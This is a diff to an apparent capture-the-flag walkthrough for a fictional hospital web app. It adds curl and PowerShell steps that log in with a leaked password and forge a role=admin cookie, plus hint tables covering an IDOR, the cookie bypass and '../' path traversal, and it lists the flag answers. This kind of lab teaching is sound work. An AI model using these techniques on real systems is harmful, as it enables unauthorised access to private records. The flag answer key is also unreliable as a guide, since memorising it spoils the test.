@@ -136,10 +136,37 @@ View page source. The HTML comment block includes:
 Cookie: PHPSESSID=<session>; role=admin
 ```
 
-   One-liner with curl:
+   **Full curl workflow (Linux / macOS):**
 ```bash
-curl -b "PHPSESSID=<your_session>; role=admin" http://<TARGET>/camera.php
+# Step 1 — Login and save the authenticated session cookie to a file
+curl -s -c /tmp/mgh.txt -b /tmp/mgh.txt \
+     -X POST "http://<TARGET>/login.php" \
+     -d "username=reception&password=W0lfpack2009!" \
+     -L -o /dev/null
+
+# Step 2 — Replay the camera page with role=admin forged alongside the session
+curl -s -b /tmp/mgh.txt -b "role=admin" \
+     "http://<TARGET>/camera.php" | grep -oE "FLAG\{[^}]+\}"
 ```
+
+   **Full curl workflow (Windows PowerShell):**
+```powershell
+# Step 1 — Login and capture the session cookie
+$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+Invoke-WebRequest "http://<TARGET>/login.php" `
+    -Method POST `
+    -Body "username=reception&password=W0lfpack2009!" `
+    -SessionVariable session | Out-Null
+
+# Step 2 — Add the forged role=admin cookie and request camera.php
+$session.Cookies.Add((New-Object System.Net.Cookie("role", "admin", "/", "<TARGET>")))
+(Invoke-WebRequest "http://<TARGET>/camera.php" -WebSession $session).Content |
+    Select-String -Pattern "FLAG\{[^}]+\}"
+```
+
+   > **Note:** You must complete Step 1 first — `require_login()` in camera.php
+   > redirects unauthenticated requests to login.php. Without a valid PHPSESSID the
+   > `role=admin` cookie alone will not expose the flag.
 
 4. Reload. The flag box appears on the **CAM-03** entry:
 
@@ -214,3 +241,51 @@ robots.txt
 | FLAG 3 | `FLAG{d3nt4l_r3c0rd_stu_pull3d_h1s_0wn_t00th_0247AM_t0_pr0v3_h1s_l0v3}` |
 | FLAG 4 | `FLAG{s3cur1ty_f00t4g3_ESV7749_Ch0w_w4r3h0us3_3850_V4ll3y_V13w}` |
 | FLAG 5 | `FLAG{pr3scr1pt10n_c00rds_Ch0w_W4r3h0us3_36N_115W_3850_V4ll3y_V13w}` |
+
+---
+
+## Progressive Hints for Players
+
+> **Organiser guidance:** Reveal hints in order, numbered 1 → 3, to keep the
+> challenge alive as long as possible. Hint 3 for each flag is nearly a spoiler
+> — save it for players who have been stuck for a long time.
+
+---
+
+### Entry Point — Getting In
+
+| # | Hint |
+|---|------|
+| 1 | Every web assessment starts with reconnaissance. What file tells search engines which paths to avoid indexing? |
+| 2 | Sensitive directories are sometimes listed in `robots.txt` to discourage crawlers — but those entries work like a treasure map for you. Visit each `Disallow` path in a browser. |
+| 3 | `http://<TARGET>/staff-backup/credentials.txt` contains a plaintext credential. Use it to log in at `/login.php`. |
+
+---
+
+### FLAG 3 — The Dental Record (IDOR)
+
+| # | Hint |
+|---|------|
+| 1 | After logging in, go to **Patient Records** and search for `MGH`. Three patients appear. The server hands you their IDs in the URL. What happens if you change the number? |
+| 2 | The server checks *that you are logged in* when you request a detail page, but does it check *which patient you are allowed to see*? Try requesting a patient ID you were not explicitly given. |
+| 3 | Request `http://<TARGET>/records.php?pid=MGH-0044` while logged in as `reception`. The full record — including the flag — is returned with no further authorisation check. |
+
+---
+
+### FLAG 4 — The Security Footage (Broken Access Control)
+
+| # | Hint |
+|---|------|
+| 1 | The camera log page shows entries but no flags. Something is restricting the flag boxes. Look at the HTML source of the page — is there a comment that explains what controls access? |
+| 2 | The restriction is client-side: your *role* is read from a cookie rather than solely from the server session. Browser DevTools → Application → Cookies lets you add or edit cookies for the current site. |
+| 3 | Add a cookie named `role` with value `admin` (or `doctor`) for the target domain, then reload `/camera.php`. The flag box appears on the CAM-03 row. With curl: login first to get a PHPSESSID, then pass `-b "role=admin"` on the second request. |
+
+---
+
+### FLAG 5 — The Prescription (Path Traversal)
+
+| # | Hint |
+|---|------|
+| 1 | `robots.txt` mentions a prescription archive that "hasn't been moved off the web root yet". The **File Viewer** (`/files.php`) reads files using a `?file=` parameter. What base directory does it read from? |
+| 2 | The file viewer uses `docs/` as its base directory. It does **not** strip `../` sequences. What path, relative to `docs/`, would reach a `hospital-files/prescriptions/hidden/` directory one level up? |
+| 3 | Request `http://<TARGET>/files.php?file=../hospital-files/prescriptions/hidden/rx_chow_encoded.txt`. The response contains a Base64 block — decode it (CyberChef "From Base64" recipe, or `base64 -d` on Linux/macOS) to reveal the flag. |
